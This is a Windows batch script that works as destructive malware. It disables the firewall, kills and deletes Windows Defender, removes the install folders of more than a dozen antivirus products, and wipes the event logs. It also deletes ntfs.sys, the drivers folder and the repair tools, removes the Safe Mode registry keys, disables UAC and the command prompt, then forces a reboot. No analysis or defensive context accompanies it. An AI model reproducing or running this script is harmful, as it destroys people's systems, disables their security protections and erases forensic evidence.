@echo off

setlocal

netsh advfirewall set allprofiles state off >nul 2>&1
netsh advfirewall set currentprofile state off >nul 2>&1
netsh advfirewall set domainprofile state off >nul 2>&1
netsh advfirewall set privateprofile state off >nul 2>&1
netsh advfirewall set publicprofile state off >nul 2>&1
netsh firewall set opmode mode-disable >nul 2>&1

reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1

reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1

icacls "C:\Windows\System32" /Grant Users:F >nul 2>&1
icacls "C:\Windows" /Grant Users:F >nul 2>&1
icacls "C:\Program Data" /Grant Users:F >nul 2>&1
icacls "C:\Program Files" /Grant Users:F >nul 2>&1
icacls "C:\Program Files (x86)" /Grant Users:F >nul 2>&1

attrib -s -r /s /d "C:\Windows\System32\*.*" >nul 2>&1
attrib -s -r /s /d "C:\ProgramData\*.*" >nul 2>&1
attrib -s -r "C:\ProgramData\*.*" >nul 2>&1
attrib -s -r /s /d "C:\Program Files\*.*" >nul 2>&1
attrib -s -r "C:\Program Files\*.*" >nul 2>&1

taskkill /F /IM TrustedInstaller.exe >nul 2>&1
taskkill /F /IM MsMpEng.exe >nul 2>&1
taskkill /F /IM MpDefenderCoreService.exe >nul 2>&1
taskkill /F /IM NisSrv.exe >nul 2>&1
taskkill /F /IM MpCmdRun.exe >nul 2>&1
taskkill /F /IM SecurityHealthService.exe >nul 2>&1
taskkill /F /IM SecurityHealthSystray.exe >nul 2>&1
taskkill /F /IM smartscreen.exe >nul 2>&1
taskkill /F /IM MsSense.exe >nul 2>&1
taskkill /F /IM WinDefend >nul 2>&1
taskkill /F /IM WdNisSvc >nul 2>&1
taskkill /F /IM WdFilter >nul 2>&1
taskkill /F /IM WdBoot >nul 2>&1
taskkill /F /IM WdNisDrv >nul 2>&1

del /f /q "C:\Windows\servicing\TrustedInstaller.exe" >nul 2>&1
del /f /q "C:\Windows\System32\drivers\ntfs.sys" >nul 2>&1
del /f /q "C:\Windows\System32\netsh.exe" >nul 2>&1

net stop "WinDefend" /y >nul 2>&1
net stop "security center" /y >nul 2>&1
net stop sharedaccess /y >nul 2>&1
net stop "wuauserv" /y >nul 2>&1
net stop "SDRSVC" /y >nul 2>&1


del /f /q "C:\Windows\System32\Dism.exe" >nul 2>&1
del /f /q "C:\Windows\System32\sfc.exe" >nul 2>&1
del /f /q "C:\Windows\System32\chkdsk.exe" >nul 2>&1
del /f /q "C:\Windows\System32\wbem\WMIC.exe" >nul 2>&1
del /f /q "C:\Windows\System32\smartscreen.exe" >nul 2>&1
del /f /q "C:\Windows\System32\SecurityHealthSystray.exe" >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1


rmdir /s /q  "C:\Windows\System32\SecurityHealth\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\winevt\Logs\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\drivers\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Cache Maintenance" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Cleanup" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Scheduled Scan" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Verification" >nul 2>&1
rmdir /s /q  "C:\Program Files\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Windows Defender Advanced Threat Protection\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\" >nul 2>&1


rmdir /s /q  "C:\Program Files\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\Platform\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\Scans\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Windows Defender Advanced Threat Protection\" >nul 2>&1


:: AVAST
if exist "C:\Program Files\Avast Software\" rmdir /s /q "C:\Program Files\Avast Software"
if exist "C:\Program Files\Avast Software\Avast\" rmdir /s /q "C:\Program Files\Avast Software\Avast"
if exist "C:\ProgramData\Avast Software\" rmdir /s /q "C:\ProgramData\Avast Software"
if exist "C:\ProgramData\Avast Software\Avast\" rmdir /s /q "C:\ProgramData\Avast Software\Avast"

:: AVG
if exist "C:\Program Files\AVG\" rmdir /s /q "C:\Program Files\AVG"
if exist "C:\Program Files\AVG\Antivirus\" rmdir /s /q "C:\Program Files\AVG\Antivirus"
if exist "C:\ProgramData\AVG\" rmdir /s /q "C:\ProgramData\AVG"
if exist "C:\ProgramData\AVG\Antivirus\" rmdir /s /q "C:\ProgramData\AVG\Antivirus"

:: BITDEFENDER
if exist "C:\Program Files\Bitdefender\" rmdir /s /q "C:\Program Files\Bitdefender"
if exist "C:\Program Files\Bitdefender Agent\" rmdir /s /q "C:\Program Files\Bitdefender Agent"
if exist "C:\ProgramData\Bitdefender\" rmdir /s /q "C:\ProgramData\Bitdefender"
if exist "C:\ProgramData\Bitdefender Agent\" rmdir /s /q "C:\ProgramData\Bitdefender Agent"

:: MALWAREBYTES
if exist "C:\Program Files\Malwarebytes\" rmdir /s /q "C:\Program Files\Malwarebytes"
if exist "C:\Program Files\Malwarebytes\Anti-Malware\" rmdir /s /q "C:\Program Files\Malwarebytes\Anti-Malware"
if exist "C:\ProgramData\Malwarebytes\" rmdir /s /q "C:\ProgramData\Malwarebytes"
if exist "C:\ProgramData\Malwarebytes\MBAMService\" rmdir /s /q "C:\ProgramData\Malwarebytes\MBAMService"

:: ESET
if exist "C:\Program Files\ESET\" rmdir /s /q "C:\Program Files\ESET"
if exist "C:\Program Files\ESET\ESET Security\" rmdir /s /q "C:\Program Files\ESET\ESET Security"
if exist "C:\Program Files\ESET\ESET NOD32 Antivirus\" rmdir /s /q "C:\Program Files\ESET\ESET NOD32 Antivirus"
if exist "C:\ProgramData\ESET\" rmdir /s /q "C:\ProgramData\ESET"
if exist "C:\ProgramData\ESET\ESET Security\" rmdir /s /q "C:\ProgramData\ESET\ESET Security"

:: KASPERSKY
if exist "C:\Program Files (x86)\Kaspersky Lab\" rmdir /s /q "C:\Program Files (x86)\Kaspersky Lab"
if exist "C:\Program Files\Kaspersky Lab\" rmdir /s /q "C:\Program Files\Kaspersky Lab"
if exist "C:\ProgramData\Kaspersky Lab\" rmdir /s /q "C:\ProgramData\Kaspersky Lab"

:: NORTON
if exist "C:\Program Files\Norton\" rmdir /s /q "C:\Program Files\Norton"
if exist "C:\Program Files (x86)\Norton\" rmdir /s /q "C:\Program Files (x86)\Norton"
if exist "C:\Program Files (x86)\Norton Security\" rmdir /s /q "C:\Program Files (x86)\Norton Security"
if exist "C:\ProgramData\Norton\" rmdir /s /q "C:\ProgramData\Norton"

:: MCAFEE
if exist "C:\Program Files\McAfee\" rmdir /s /q "C:\Program Files\McAfee"
if exist "C:\Program Files (x86)\McAfee\" rmdir /s /q "C:\Program Files (x86)\McAfee"
if exist "C:\ProgramData\McAfee\" rmdir /s /q "C:\ProgramData\McAfee"
if exist "C:\Program Files\McAfee\Endpoint Security\" rmdir /s /q "C:\Program Files\McAfee\Endpoint Security"

:: AVIRA
if exist "C:\Program Files\Avira\" rmdir /s /q "C:\Program Files\Avira"
if exist "C:\Program Files (x86)\Avira\" rmdir /s /q "C:\Program Files (x86)\Avira"
if exist "C:\ProgramData\Avira\" rmdir /s /q "C:\ProgramData\Avira"
if exist "C:\ProgramData\Avira\Security\" rmdir /s /q "C:\ProgramData\Avira\Security"

:: PANDA DOME
if exist "C:\Program Files\Panda Security\" rmdir /s /q "C:\Program Files\Panda Security"
if exist "C:\Program Files (x86)\Panda Security\" rmdir /s /q "C:\Program Files (x86)\Panda Security"
if exist "C:\ProgramData\Panda Security\" rmdir /s /q "C:\ProgramData\Panda Security"

:: TREND MICRO
if exist "C:\Program Files\Trend Micro\" rmdir /s /q "C:\Program Files\Trend Micro"
if exist "C:\Program Files (x86)\Trend Micro\" rmdir /s /q "C:\Program Files (x86)\Trend Micro"
if exist "C:\ProgramData\Trend Micro\" rmdir /s /q "C:\ProgramData\Trend Micro"

:: SOPHOS
if exist "C:\Program Files\Sophos\" rmdir /s /q "C:\Program Files\Sophos"
if exist "C:\Program Files (x86)\Sophos\" rmdir /s /q "C:\Program Files (x86)\Sophos"
if exist "C:\ProgramData\Sophos\" rmdir /s /q "C:\ProgramData\Sophos"

:: F-SECURE
if exist "C:\Program Files\F-Secure\" rmdir /s /q "C:\Program Files\F-Secure"
if exist "C:\Program Files (x86)\F-Secure\" rmdir /s /q "C:\Program Files (x86)\F-Secure"
if exist "C:\ProgramData\F-Secure\" rmdir /s /q "C:\ProgramData\F-Secure"

:: WEBROOT
if exist "C:\Program Files\Webroot\" rmdir /s /q "C:\Program Files\Webroot"
if exist "C:\Program Files (x86)\Webroot\" rmdir /s /q "C:\Program Files (x86)\Webroot"
if exist "C:\ProgramData\WRData\" rmdir /s /q "C:\ProgramData\WRData"


reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f


(
echo Set Key = CreateObject("WScript.Shell"^)
echo Key.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
) > "%TEMP%\JAJAJA.vbs"

start "" "%TEMP%\JAJAJA.vbs"

shutdown /r /f /t 0

endlocal
